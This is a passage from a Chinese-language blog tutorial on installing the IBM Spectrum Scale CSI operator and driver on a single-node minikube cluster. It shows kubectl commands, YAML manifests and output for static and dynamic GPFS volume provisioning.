align="center">x86,ppc64le</td><td align="center">5.1.9.x 或更高版本</td><td align="center">4.16、4.17、4.18</td></tr></tbody></table><h2 id="4-1、部署-CSI-Operator"><a href="#4-1、部署-CSI-Operator" class="headerlink" title="4.1、部署 CSI Operator"></a>4.1、部署 CSI Operator</h2><blockquote><p><strong>注意:</strong> 以下操作需要使用非 root 用户操作。</p></blockquote><p><strong>相关命令:</strong> (位于 10.10.0.3 机器上执行)</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建命名空间</span><br>kubectl create namespace ibm-spectrum-scale-csi-driver<br><br><span class="hljs-comment"># 下载 CSI 2.11.1 Operator 配置清单</span><br>curl -O https://raw.githubusercontent.com/IBM/ibm-spectrum-scale-csi/v2.11.1/generated/installer/ibm-spectrum-scale-csi-operator.yaml<br><br><span class="hljs-comment"># 应用 CSI 2.11.1 Operator 配置清单</span><br>kubectl create -f ibm-spectrum-scale-csi-operator.yaml<br><br><span class="hljs-comment"># 验证 Operator 是否已部署，并且 Operator pod 处于运行状态</span><br>kubectl get pod,deployment -n ibm-spectrum-scale-csi-driver<br></code></pre></td></tr></table></figure><p><strong>相关输出信息:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[bugwz@node03 data]$ kubectl get pod,deployment -n ibm-spectrum-scale-csi-driver<br>NAME                                                   READY   STATUS    RESTARTS   AGE<br>pod/ibm-spectrum-scale-csi-operator-8457c4b588-lmrbg   1/1     Running   0          35s<br><br>NAME                                              READY   UP-TO-DATE   AVAILABLE   AGE<br>deployment.apps/ibm-spectrum-scale-csi-operator   1/1     1            1           35s<br></code></pre></td></tr></table></figure><h2 id="4-2、部署-CSI-驱动程序"><a href="#4-2、部署-CSI-驱动程序" class="headerlink" title="4.2、部署 CSI 驱动程序"></a>4.2、部署 CSI 驱动程序</h2><blockquote><p><strong>注意:</strong> 以下操作需要使用非 root 用户操作。</p></blockquote><p><strong>相关命令:</strong> (位于 10.10.0.3 机器上执行)</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用 IBM Storage Scale GUI 服务器的凭证在 ibm-spectrum-scale-csi-driver 命名空间中创建密钥</span><br><span class="hljs-comment"># 创建的密钥名为 csisecret ，使用的 GUI 用户名为 csiuser ，GUI 用户密码为 csipassword </span><br><span class="hljs-comment"># 注意下面使用 GUI 用户角色必须为 csiadmin</span><br>kubectl create secret generic csisecret --from-literal=username=csiuser --from-literal=password=csipassword -n ibm-spectrum-scale-csi-driver<br><br><span class="hljs-comment"># 密钥匹配 CSI 产品</span><br>kubectl label secret csisecret product=ibm-spectrum-scale-csi -n ibm-spectrum-scale-csi-driver<br><br><span class="hljs-comment"># 查看 secret 详细信息</span><br>kubectl describe secrets csisecret -n ibm-spectrum-scale-csi-driver<br>kubectl get secrets csisecret -o yaml -n ibm-spectrum-scale-csi-driver<br><br><br><span class="hljs-comment"># 如果 secret 配置错了，可以使用下面的命令修改用户或密码</span><br>kubectl get secrets csisecret -o yaml -n ibm-spectrum-scale-csi-driver<br><span class="hljs-comment"># 解析其中的用户或者密码</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;Y3NpdXNlcg==&#x27;</span>| <span class="hljs-built_in">base64</span> -d<br><span class="hljs-comment"># 生成新的用户或密码</span><br><span class="hljs-built_in">echo</span> -n <span class="hljs-string">&#x27;csipassword&#x27;</span> | <span class="hljs-built_in">base64</span><br><span class="hljs-comment"># 修改用户或密码</span><br>kubectl edit secret csisecret -n ibm-spectrum-scale-csi-driver<br><br><br><span class="hljs-comment"># 新增 Operator 自定义资源所需的配置参数文件，该资源用于配置 CSI 驱动程序</span><br><span class="hljs-comment"># 文件名为 csiscaleoperators.csi.ibm.com_cr.yaml</span><br><span class="hljs-comment"># </span><br>vi csiscaleoperators.csi.ibm.com_cr.yaml<br><span class="hljs-built_in">cat</span> csiscaleoperators.csi.ibm.com_cr.yaml<br><br><span class="hljs-comment"># 部署 CSI 驱动程序</span><br>kubectl apply -f csiscaleoperators.csi.ibm.com_cr.yaml<br><br><span class="hljs-comment"># 验证 CSI 驱动程序等资源是否就绪</span><br><span class="hljs-comment"># 注意: 由于 K8S 测试集群只有一个节点，且由于 csi attacher 配置了 pod 的亲和性，导致两个 csi attacher 无法部署</span><br><span class="hljs-comment">#       到同一个 node 上，从而导致只有一个 csi attacher 处于运行状态。</span><br>kubectl get pod,daemonset,deployment -n ibm-spectrum-scale-csi-driver<br></code></pre></td></tr></table></figure><blockquote><p><strong>注意:</strong> 由于我们使用 minikube 搭建的虚拟机环境，且虚拟机 hostname 为 minikube ，因此在检测 GPFS 挂载点的时候无法与 node03 对应上， 为此我们需要建立 K8S 节点与 GPFS 节点的映射关系。 详见 <a href="https://www.ibm.com/docs/en/scalecsi?topic=o-kubernetes-spectrum-scale-node-mapping-9#concept_or5_3q1_zjb">修改映射关系的 IBM Doc</a> 。 修改后的 csiscaleoperators.csi.ibm.com_cr.yaml 文件内容如下。</p></blockquote><p><strong>csiscaleoperators.csi.ibm.com_cr.yaml 文件内容:</strong> (详细文档参考 <a href="https://www.ibm.com/docs/en/scalecsi/2.11.0?topic=configurations-operator#concept_aqh_zg5_xjb">IBM Doc</a> , )</p><figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">csi.ibm.com/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">&quot;CSIScaleOperator&quot;</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">&quot;ibm-spectrum-scale-csi&quot;</span><br>  <span class="hljs-attr">namespace:</span> <span class="hljs-string">&quot;ibm-spectrum-scale-csi-driver&quot;</span><br>  <span class="hljs-attr">labels:</span><br>    <span class="hljs-attr">app.kubernetes.io/name:</span> <span class="hljs-string">ibm-spectrum-scale-csi-operator</span><br>    <span class="hljs-attr">app.kubernetes.io/instance:</span> <span class="hljs-string">ibm-spectrum-scale-csi-operator</span><br>    <span class="hljs-attr">app.kubernetes.io/managed-by:</span> <span class="hljs-string">ibm-spectrum-scale-csi-operator</span><br>    <span class="hljs-attr">release:</span> <span class="hljs-string">ibm-spectrum-scale-csi-operator</span><br><span class="hljs-attr">status:</span> &#123;&#125;<br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">clusters:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">id:</span> <span class="hljs-string">&quot;12883004940135644857&quot;</span><br>      <span class="hljs-attr">secrets:</span> <span class="hljs-string">&quot;csisecret&quot;</span><br>      <span class="hljs-attr">secureSslMode:</span> <span class="hljs-literal">false</span><br>      <span class="hljs-attr">primary:</span><br>        <span class="hljs-attr">primaryFs:</span> <span class="hljs-string">&quot;defaultfs&quot;</span><br>      <span class="hljs-attr">restApi:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">guiHost:</span> <span class="hljs-string">&quot;10.10.0.1&quot;</span><br>  <span class="hljs-attr">nodeMapping:</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-attr">k8sNode:</span> <span class="hljs-string">&quot;minikube&quot;</span><br>     <span class="hljs-attr">spectrumscaleNode:</span> <span class="hljs-string">&quot;node03&quot;</span><br>  <span class="hljs-attr">attacherNodeSelector:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">key:</span> <span class="hljs-string">&quot;scale&quot;</span><br>      <span class="hljs-attr">value:</span> <span class="hljs-string">&quot;true&quot;</span><br>  <span class="hljs-attr">provisionerNodeSelector:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">key:</span> <span class="hljs-string">&quot;scale&quot;</span><br>      <span class="hljs-attr">value:</span> <span class="hljs-string">&quot;true&quot;</span><br>  <span class="hljs-attr">pluginNodeSelector:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">key:</span> <span class="hljs-string">&quot;scale&quot;</span><br>      <span class="hljs-attr">value:</span> <span class="hljs-string">&quot;true&quot;</span><br>  <span class="hljs-attr">snapshotterNodeSelector:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">key:</span> <span class="hljs-string">&quot;scale&quot;</span><br>      <span class="hljs-attr">value:</span> <span class="hljs-string">&quot;true&quot;</span><br>  <span class="hljs-attr">resizerNodeSelector:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">key:</span> <span class="hljs-string">&quot;scale&quot;</span><br>      <span class="hljs-attr">value:</span> <span class="hljs-string">&quot;true&quot;</span><br></code></pre></td></tr></table></figure><p>在以上配置中，我们只需要关注 <code>cluster</code> 字段内部的配置。</p><ul><li><code>id</code> : GPFS 集群 ID ，可通过 <code>mmlscluster</code> 命令获取；</li><li><code>secrets</code> : 预创建的 Secret 的名称，其中包含用于连接到 id 参数所指定集群的 GUI 服务器的用户名和密码；</li><li><code>primaryFs</code> : 主文件系统名称；</li><li><code>guiHost</code> : 针对 GPFS 集群指定的 GUI 节点的 FQDN 或 IP 地址，如果多个可设置多个 guiHost 参数进行指定；</li></ul><p><strong>相关输出信息:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[bugwz@node03 data]$ kubectl get pod,daemonset,deployment -n ibm-spectrum-scale-csi-driver<br>NAME                                                      READY   STATUS    RESTARTS   AGE<br>pod/ibm-spectrum-scale-csi-attacher-764479b5-qn9df        0/1     Pending   0          28m<br>pod/ibm-spectrum-scale-csi-attacher-764479b5-zxtbz        1/1     Running   0          28m<br>pod/ibm-spectrum-scale-csi-g75vn                          3/3     Running   0          28m<br>pod/ibm-spectrum-scale-csi-operator-8457c4b588-lmrbg      1/1     Running   0          29m<br>pod/ibm-spectrum-scale-csi-provisioner-6db678cd-wrt7w     1/1     Running   0          28m<br>pod/ibm-spectrum-scale-csi-resizer-659c95b8cc-vtbcc       1/1     Running   0          28m<br>pod/ibm-spectrum-scale-csi-snapshotter-6495f6bd4d-hzskh   1/1     Running   0          28m<br><br>NAME                                    DESIRED   CURRENT   READY   UP-TO-DATE   AVAILABLE   NODE SELECTOR   AGE<br>daemonset.apps/ibm-spectrum-scale-csi   1         1         1       1            1           scale=<span class="hljs-literal">true</span>      28m<br><br>NAME                                                 READY   UP-TO-DATE   AVAILABLE   AGE<br>deployment.apps/ibm-spectrum-scale-csi-attacher      1/2     2            1           28m<br>deployment.apps/ibm-spectrum-scale-csi-operator      1/1     1            1           29m<br>deployment.apps/ibm-spectrum-scale-csi-provisioner   1/1     1            1           28m<br>deployment.apps/ibm-spectrum-scale-csi-resizer       1/1     1            1           28m<br>deployment.apps/ibm-spectrum-scale-csi-snapshotter   1/1     1            1           28m<br></code></pre></td></tr></table></figure><h1 id="五、使用-CSI"><a href="#五、使用-CSI" class="headerlink" title="五、使用 CSI"></a>五、使用 CSI</h1><h2 id="5-1、静态配置"><a href="#5-1、静态配置" class="headerlink" title="5.1、静态配置"></a>5.1、静态配置</h2><p>使用现有的静态配置清单进行静态配置。实现通过手动定义存储卷来访问 GPFS 中预先存在的数据。按照 K8S 的实现，我们可以手动创建 PV&#x2F;PVC ，然后启动一个 Pod 来通过 CSI 使用对应的存储资源，以下步骤参考 <a href="https://www.ibm.com/docs/en/scalecsi/2.11.0?topic=driver-static-provisioning">IBM Doc</a> 。</p><blockquote><p><strong>注意:</strong> 从 GPFS CSI 2.14.x 开始，除了现有的清单进行静态配置的方法外，还支持动态方式的静态配置。这种新方法增强了卷操作的功能，例如卷快照、克隆和恢复，并具有更大的灵活性。详见 <a href="https://www.ibm.com/docs/en/scalecsi/2.14.0?topic=provisioning-static-in-dynamic-way-recommended">IBM Doc</a> 。 但由于本文的测试环境仅可用于 GPFS CSI 2.11.x 版本， 所以该特性并不详细介绍。</p></blockquote><h3 id="5-1-1、生成静态配置清单"><a href="#5-1-1、生成静态配置清单" class="headerlink" title="5.1.1、生成静态配置清单"></a>5.1.1、生成静态配置清单</h3><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 下载静态配置清单生成脚本</span><br>curl -O https://raw.githubusercontent.com/IBM/ibm-spectrum-scale-csi/v2.11.1/tools/generate_static_provisioning_yamls.sh<br><br><span class="hljs-comment"># 生成静态配置清单</span><br><span class="hljs-comment"># 注意: --path 和 --fileset 选项互斥。必须至少指定其中一个选项。</span><br><span class="hljs-comment"># 注意: 该脚本执行时会要求输入 GUI 的用户名和密码，需要输入 admin 的用户密码</span><br><span class="hljs-comment"># </span><br><span class="hljs-comment"># 示例1: 基于目录的静态卷，生成静态配置清单</span><br><span class="hljs-comment"># ./generate_static_provisioning_yamls.sh --filesystem defaultfs --path /gpfsdata/fs1/staticpv --size 10 --pvname mystaticpv --guihost 10.10.0.1</span><br><span class="hljs-comment"># </span><br><span class="hljs-comment"># 示例2: 基于文件集的卷，生成静态配置清单</span><br><span class="hljs-comment"># ./generate_static_provisioning_yamls.sh --filesystem defaultfs --fileset f1 --size 10 --pvname mystaticpv --guihost 10.10.0.1</span><br><span class="hljs-comment"># </span><br><span class="hljs-built_in">mkdir</span> -p /gpfsdata/k8s/staticpv<br>./generate_static_provisioning_yamls.sh --filesystem defaultfs --path /gpfsdata/k8s/staticpv --size 10 --pvname mystaticpv --guihost 10.10.0.1<br></code></pre></td></tr></table></figure><p><strong>相关输出信息:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[bugwz@node03 data]$ ./generate_static_provisioning_yamls.sh --filesystem defaultfs --path /gpfsdata/k8s/staticpv --size 10 --pvname mystaticpv --guihost 10.10.0.1<br>GUI Username: admin<br>GUI Password:<br>INFO: volumeHandle: 0;0;12883004940135644857;3A1B320A:68633F8D;;;/gpfsdata/k8s/staticpv<br>INFO: Successfully created mystaticpv.yaml<br>INFO: Successfully created pvc-mystaticpv.yaml<br><br>[bugwz@node03 data]$ ll<br>-rwxrwxr-x 1 bugwz bugwz 12839 Jul  1 15:47 generate_static_provisioning_yamls.sh<br>-rw-rw-r-- 1 bugwz bugwz   313 Jul  1 15:56 mystaticpv.yaml<br>-rw-rw-r-- 1 bugwz bugwz   237 Jul  1 16:07 pvc-mystaticpv.yaml<br></code></pre></td></tr></table></figure><h3 id="5-1-2、创建PV"><a href="#5-1-2、创建PV" class="headerlink" title="5.1.2、创建PV"></a>5.1.2、创建PV</h3><p>持久卷 (PV) 是由管理员静态配置或使用存储类动态配置的存储。其示例文件模板为 <a href="https://github.com/IBM/ibm-spectrum-scale-csi/blob/v2.11.1/driver/examples/version1/volume/staticprovisioning/static_pv.yaml">static_pv.yaml</a> 。 这里仅展示通过上述脚本生成的对应配置文件的内容，并解释其字段信息。</p><p><strong>mystaticpv.yaml 内容:</strong></p><figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># -- mystaticpv.yaml</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">PersistentVolume</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">mystaticpv</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">capacity:</span><br>    <span class="hljs-attr">storage:</span> <span class="hljs-string">10Gi</span><br>  <span class="hljs-attr">accessModes:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">ReadWriteMany</span><br>  <span class="hljs-attr">csi:</span><br>    <span class="hljs-attr">driver:</span> <span class="hljs-string">spectrumscale.csi.ibm.com</span><br>    <span class="hljs-attr">volumeHandle:</span> <span class="hljs-number">0</span><span class="hljs-string">;0;12883004940135644857;3A1B320A:68633F8D;;;/gpfsdata/k8s/staticpv</span><br>  <span class="hljs-attr">storageClassName:</span> <span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><p><strong>volumeHandle 字段解析:</strong> </p><ul><li><code>格式</code>: 0;[Volume type];[Cluster ID];[Filesystem UUID];;[Fileset name];[Path to the directory or fileset linkpath]</li><li><code>字段含义</code>:<ul><li><code>Volume type</code> : 卷类型。基于目录的卷该值为 0 ，基于依赖文件集的卷该值为 1 ，基于独立文件集的卷该值为 2 。</li><li><code>Cluster ID</code> : GPFS 集群 ID 。 可通过 mmlscluster 命令获取。</li><li><code>Filesystem UUID</code> : GPFS 集群中文件系统的 UUID 。可通过 mmlsfs defaultfs –uid 命令获取。</li><li><code>空值</code> :</li><li><code>Fileset name</code> : 文件集名称。由于这里使用目录，所以该值为空；</li><li><code>Path to the directory or fileset linkpath</code> : 目录的完整路径；</li></ul></li></ul><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用上述生成的 mystaticpv.yaml 文件创建 PV</span><br>kubectl apply -f mystaticpv.yaml<br><br><span class="hljs-comment"># 查看服务状态</span><br>kubectl get pv,pvc,pod,deployment -n default<br></code></pre></td></tr></table></figure><h3 id="5-1-3、创建PVC"><a href="#5-1-3、创建PVC" class="headerlink" title="5.1.3、创建PVC"></a>5.1.3、创建PVC</h3><p>PVC 是用户对存储的请求。PVC 有两种类型: 静态配置和动态配置。其静态配置的示例文件模板为 <a href="https://github.com/IBM/ibm-spectrum-scale-csi/blob/v2.11.1/driver/examples/version1/volume/staticprovisioning/static_pvc.yaml">static_pvc.yaml</a> 。 这里仅展示通过上述脚本生成的对应配置文件的内容。</p><blockquote><p><strong>注意:</strong> 如果手动修改对应的 PVC 文件，需要确保 PVC 请求的存储空间要小于等于特定 PV 的存储空间，这样才能绑定成功。</p></blockquote><p><strong>pvc-mystaticpv.yaml 内容:</strong></p><figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># -- pvc-mystaticpv.yaml</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">PersistentVolumeClaim</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">pvc-mystaticpv</span><br>  <span class="hljs-attr">namespace:</span> <span class="hljs-string">default</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">volumeName:</span> <span class="hljs-string">mystaticpv</span><br>  <span class="hljs-attr">accessModes:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">ReadWriteMany</span><br>  <span class="hljs-attr">resources:</span><br>    <span class="hljs-attr">requests:</span><br>      <span class="hljs-attr">storage:</span> <span class="hljs-string">10Gi</span><br>  <span class="hljs-attr">storageClassName:</span> <span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建 PV</span><br><span class="hljs-comment"># 设置对应文件中的 namespace 字段值为 default</span><br>kubectl apply -f pvc-mystaticpv.yaml<br><br><span class="hljs-comment"># 查看服务状态</span><br>kubectl get pv,pvc,pod,deployment -n default<br></code></pre></td></tr></table></figure><h3 id="5-1-4、创建Pod"><a href="#5-1-4、创建Pod" class="headerlink" title="5.1.4、创建Pod"></a>5.1.4、创建Pod</h3><p>其示例文件模板为 <a href="https://github.com/IBM/ibm-spectrum-scale-csi/blob/v2.11.1/driver/examples/version1/volume/staticprovisioning/static_pod.yaml">static_pod.yaml</a> 。 </p><blockquote><p><strong>注意:</strong> claimName 是 Pod 用于持久化存储的 PVC 名称。 readOnly 标志可以设置为 true ，在这种情况下， Pod 会以只读模式挂载 PVC 。</p></blockquote><p><strong>static_pod.yaml 内容:</strong></p><figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">csi-scale-staticdemo-pod</span><br>  <span class="hljs-attr">labels:</span><br>    <span class="hljs-attr">app:</span> <span class="hljs-string">nginx</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">containers:</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">web-server</span><br>     <span class="hljs-attr">image:</span> <span class="hljs-string">nginx</span><br>     <span class="hljs-attr">volumeMounts:</span><br>       <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">mypvc</span><br>         <span class="hljs-attr">mountPath:</span> <span class="hljs-string">/usr/share/nginx/html/scale</span><br>     <span class="hljs-attr">ports:</span><br>     <span class="hljs-bullet">-</span> <span class="hljs-attr">containerPort:</span> <span class="hljs-number">80</span><br>  <span class="hljs-attr">volumes:</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">mypvc</span><br>     <span class="hljs-attr">persistentVolumeClaim:</span><br>       <span class="hljs-attr">claimName:</span> <span class="hljs-string">pvc-mystaticpv</span><br>       <span class="hljs-attr">readOnly:</span> <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建 Pod</span><br>kubectl apply -f static_pod.yaml<br><br><span class="hljs-comment"># 查看服务状态</span><br>kubectl get pv,pvc,pod,deployment -n default<br><br><span class="hljs-comment"># 进入 Pod 查看映射的目录信息</span><br>kubectl <span class="hljs-built_in">exec</span> -it csi-scale-staticdemo-pod -- /bin/bash<br><span class="hljs-built_in">df</span> -h /usr/share/nginx/html/scale<br></code></pre></td></tr></table></figure><p><strong>相关输出信息:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[bugwz@node03 data]$ kubectl get pod -n default<br>NAME                       READY   STATUS    RESTARTS   AGE<br>csi-scale-staticdemo-pod   1/1     Running   0          4m20s<br><br>[bugwz@node03 data]$ kubectl <span class="hljs-built_in">exec</span> -it csi-scale-staticdemo-pod -- /bin/bash<br>root@csi-scale-staticdemo-pod:/# <span class="hljs-built_in">df</span> -h /usr/share/nginx/html/scale<br>Filesystem      Size  Used Avail Use% Mounted on<br>defaultfs       600G   39G  562G   7% /usr/share/nginx/html/scale<br></code></pre></td></tr></table></figure><h2 id="5-2、动态配置"><a href="#5-2、动态配置" class="headerlink" title="5.2、动态配置"></a>5.2、动态配置</h2><p>参考 <a href="https://www.ibm.com/docs/en/scalecsi/2.11.0?topic=driver-dynamic-provisioning">IBM Doc: Driver Dynamic Provisioning</a></p><h3 id="5-2-1、轻量级卷"><a href="#5-2-1、轻量级卷" class="headerlink" title="5.2.1、轻量级卷"></a>5.2.1、轻量级卷</h3><p>轻量级卷（Lightweight Volumes）是基于目录的卷，为每个新的动态卷创建一个新目录。没有创建卷的数量限制，但是缺少配额和快照的功能。参考 <a href="https://www.ibm.com/docs/en/scalecsi/2.11.0?topic=class-storage-creating-lightweight-volumes">IBM Doc: Creating Lightweight Volumes</a> 。</p><h4 id="5-2-1-1、创建StorageClass"><a href="#5-2-1-1、创建StorageClass" class="headerlink" title="5.2.1.1、创建StorageClass"></a>5.2.1.1、创建StorageClass</h4><p><strong>storageclasslw.yaml 配置:</strong>  (参考 <a href="https://github.com/IBM/ibm-spectrum-scale-csi/blob/v2.11.1/driver/examples/version1/volume/dynamicprovisioning/lightweight/storageclasslw.yaml">storageclasslw.yaml</a>)</p><figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">storage.k8s.io/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">StorageClass</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">ibm-spectrum-scale-csi-lt</span><br><span class="hljs-attr">provisioner:</span> <span class="hljs-string">spectrumscale.csi.ibm.com</span><br><span class="hljs-attr">parameters:</span><br>  <span class="hljs-attr">volBackendFs:</span> <span class="hljs-string">&quot;defaultfs&quot;</span><br>  <span class="hljs-attr">volDirBasePath:</span> <span class="hljs-string">&quot;dynamic/lightweight&quot;</span><br><span class="hljs-attr">reclaimPolicy:</span> <span class="hljs-string">Delete</span><br></code></pre></td></tr></table></figure><p><strong>关键字段解释:</strong></p><ul><li><code>volBackendFs</code> : 对应 GPFS 文件系统名称，必须在其上创建基于目录的卷的文件系统。</li><li><code>volDirBasePath</code> : 对应 GPFS 文件系统中挂载点的相对路径，此路径必须存在。</li></ul><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 应用 storageclass 配置</span><br>kubectl apply -f storageclasslw.yaml<br><br><span class="hljs-comment"># 查看 storageclass 状态</span><br>kubectl get storageclass -n default<br></code></pre></td></tr></table></figure><p><strong>相关输出记录:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[bugwz@node03 dynamic]$ kubectl apply -f storageclasslw.yaml<br>storageclass.storage.k8s.io/ibm-spectrum-scale-csi-lt created<br><br>[bugwz@node03 dynamic]$ kubectl get storageclass -n default<br>NAME                        PROVISIONER                 RECLAIMPOLICY   VOLUMEBINDINGMODE   ALLOWVOLUMEEXPANSION   AGE<br>ibm-spectrum-scale-csi-lt   spectrumscale.csi.ibm.com   Delete          Immediate           <span class="hljs-literal">false</span>                  116s<br>standard (default)          k8s.io/minikube-hostpath    Delete          Immediate           <span class="hljs-literal">false</span>                  13h<br></code></pre></td></tr></table></figure><h4 id="5-2-1-2、创建PVC"><a href="#5-2-1-2、创建PVC" class="headerlink" title="5.2.1.2、创建PVC"></a>5.2.1.2、创建PVC</h4><p>使用此 storageClass 创建持久卷声明 (PVC)，如以下示例所示： 根据您的要求修改 PVC 名称、存储和 storageClassName 值。</p><p><strong>pvclw.yaml 配置:</strong>  (参考 <a href="https://github.com/IBM/ibm-spectrum-scale-csi/blob/v2.11.1/driver/examples/version1/volume/dynamicprovisioning/lightweight/pvclw.yaml">pvclw.yaml</a>)</p><figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">PersistentVolumeClaim</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">scale-lt-pvc</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">accessModes:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">ReadWriteMany</span><br>  <span class="hljs-attr">resources:</span><br>    <span class="hljs-attr">requests:</span><br>      <span class="hljs-attr">storage:</span> <span class="hljs-string">1Gi</span><br>  <span class="hljs-attr">storageClassName:</span> <span class="hljs-string">ibm-spectrum-scale-csi-lt</span><br></code></pre></td></tr></table></figure><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 应用 pvc 配置</span><br>kubectl apply -f pvclw.yaml<br><br><span class="hljs-comment"># 查看 pvc 状态</span><br>kubectl get storageclass,pvc -n default<br><br><span class="hljs-comment"># 查看 GPFS 数据目录信息</span><br><span class="hljs-built_in">sudo</span> tree /gpfsdata/dynamic/lightweight/<br></code></pre></td></tr></table></figure><p><strong>相关输出记录:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[bugwz@node03 lw]$ kubectl get storageclass,pvc -n default<br>NAME                                                    PROVISIONER                 RECLAIMPOLICY   VOLUMEBINDINGMODE   ALLOWVOLUMEEXPANSION   AGE<br>storageclass.storage.k8s.io/ibm-spectrum-scale-csi-lt   spectrumscale.csi.ibm.com   Delete          Immediate           <span class="hljs-literal">false</span>                  20m<br>storageclass.storage.k8s.io/standard (default)          k8s.io/minikube-hostpath    Delete          Immediate           <span class="hljs-literal">false</span>                  13h<br><br>NAME                                   STATUS   VOLUME                                     CAPACITY   ACCESS MODES   STORAGECLASS                VOLUMEATTRIBUTESCLASS   AGE<br>persistentvolumeclaim/scale-lt-pvc     Bound    pvc-9e61d403-2005-48f7-960f-ddddac18b2c8   1Gi        RWX            ibm-spectrum-scale-csi-lt   &lt;<span class="hljs-built_in">unset</span>&gt;                 3m44s<br><br><br>[bugwz@node03 lightweight]# <span class="hljs-built_in">sudo</span> tree /gpfsdata/dynamic/lightweight/<br>/gpfsdata/dynamic/lightweight/<br>└── pvc-9e61d403-2005-48f7-960f-ddddac18b2c8<br><br>1 directory, 0 files<br></code></pre></td></tr></table></figure><h4 id="5-2-1-3、创建Pod"><a href="#5-2-1-3、创建Pod" class="headerlink" title="5.2.1.3、创建Pod"></a>5.2.1.3、创建Pod</h4><p>对应以上配置修改下面的信息。</p><p><strong>podlw.yaml 配置:</strong>  (参考 <a href="https://github.com/IBM/ibm-spectrum-scale-csi/blob/v2.11.1/driver/examples/version1/volume/dynamicprovisioning/lightweight/podlw.yaml">pvclw.yaml</a>)</p><figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">csi-scale-ltwtdemo-pod</span><br>  <span class="hljs-attr">labels:</span><br>    <span class="hljs-attr">app:</span> <span class="hljs-string">nginx</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">containers:</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">web-server</span><br>     <span class="hljs-attr">image:</span> <span class="hljs-string">nginx</span> <br>     <span class="hljs-attr">volumeMounts:</span><br>       